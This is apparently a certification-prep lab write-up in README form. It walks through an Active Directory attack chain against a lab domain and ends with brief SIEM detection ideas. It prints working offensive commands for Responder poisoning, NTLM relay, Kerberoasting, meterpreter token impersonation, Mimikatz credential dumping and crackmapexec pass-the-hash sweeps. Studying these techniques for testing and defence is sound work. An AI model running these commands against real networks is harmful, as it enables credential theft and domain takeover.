# Active Directory Attack & Defense Lab

## Overview
This lab demonstrates a full Active Directory attack lifecycle including:
- LLMNR Poisoning
- SMB Relay
- Kerberoasting
- Token Impersonation
- Credential Dumping (Mimikatz)
- Pass-the-Hash / Pass-the-Password
- GPP Attacks

---

## Attack Walkthrough

### 1.🔎  LLMNR Poisoning
![LLMNR](docs/screenshots/LLMNR-01.png)
![LLMNR](docs/screenshots/LLMNR-02.png)

Captured NTLM hashes using Responder
Exploited weak name resolution

### 2. SMB Relay
![SMB Relay](docs/screenshots/smbrelay-01.png)
![SMB Relay](docs/screenshots/smbrelay-02.png)

SMB Signing Check
✔️ SMB Signing NOT required → vulnerable

Running Responder & NTLM Relay
-> sudo responder -I tun0 -dwP
-> ntlmrelayx.py -tf targets.txt -smb2support

### 3. Kerberoasting
![Kerberoasting](docs/screenshots/Kerberoasting.png)
![Kerberoasting](docs/screenshots/Krbtgt.png)

-> GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.138.1 -request

Outcome 
Extracted service account hashes
Offline password cracking → privilege escalation


### 4. 👤 Token Impersonation (privilege escalation)
![Token](docs/screenshots/token_imp.png)

meterpreter > impersonate_token MARVEL\\fcastle

✔️ Successfully impersonated domain use


### 5. 🔑 Mimikatz Credential Dumping
![Mimikatz](docs/screenshots/mimikatz.png)


Once admin access is achieved:
Invoke-Mimikatz -Command "privilege::debug"
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"

### 6. Pass-the-Hash & Pass-the-Password
![PTP](docs/screenshots/ptp-01.png)
![PTP](docs/screenshots/ptp-02.png)

crackmapexec smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p Password1

![PTH](docs/screenshots/ptp-02.png)

crackmapexec smb 10.0.0.0/24 -u administrator -H <hash> --local-auth


### 7. GPP (Group Policy Preferences) Attack
![GPP](docs/screenshots/PTH.png)

Admins stored credentials in Group Policy Preferences
Passwords encrypted but key publicly known


---

## Full Attack Chain Summary

Stage	                        Technique
Initial Access	             LLMNR Poisoning
Credential Capture	          Responder
Lateral Movement	             SMB Relay
Privilege Escalation	         Kerberoasting
Token Abuse	                 Impersonation
Credential Dumping	             Mimikatz
Persistence	                 Pass-the-Hash
Domain Compromise	             GPP Attack




## Detection Engineering (SIEM)
🔍 Use Cases:
NTLM authentication anomalies
LSASS access detection
Service account abuse
Lateral movement via SMB
Kerberos ticket abuse

---

## Disclaimer
I developed this lab during my preparation for the PJPT (Practical Junior Penetration Tester) certification. It covers most of the key Active Directory attack techniques that the exam is based on. I hope this write-up helps everyone who is reading and preparing.

I will also be sharing a separate blog detailing the strategy I followed to prepare for the exam in 30 days.



👨‍💻 Author

Shubhom Rawat

PenTest+ | eJPT | PJPT | CCSK
Cybersecurity @ Penn State